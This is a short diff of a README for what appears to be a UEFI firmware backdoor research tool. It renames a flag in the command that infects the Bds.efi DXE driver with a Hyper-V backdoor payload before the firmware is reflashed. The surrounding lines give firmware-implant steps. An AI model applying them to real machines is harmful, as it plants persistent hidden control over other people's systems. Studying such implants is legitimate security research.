@@ -127,7 +127,7 @@ After that you need to open dunped firmware in UEFITool, locate arbitrary UEFI D
 For example, I chosed `Bds.efi` DXE driver responsible for boot device selection as pretty much suitable one. Then you can infect extracted driver with Hyper-V backdoor using `infector.py` program:
 
 ```
-> python infector.py --payload DmaBackdoorHv_X64.efi --infect Bds.efi --output Bds_infected.efi
+> python infector.py --dxe-driver DmaBackdoorHv_X64.efi --infect Bds.efi --output Bds_infected.efi
 ```
 
 After that you have to replace original driver image with `Bds_infected.efi` one in UEFITool, save resulting firmware image and flash it back into the chip:
